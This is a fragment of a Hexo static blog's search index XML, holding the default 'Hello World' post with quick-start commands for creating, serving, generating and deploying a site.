      <link href="/2022/08/06/hello-world/"/>
      <url>/2022/08/06/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
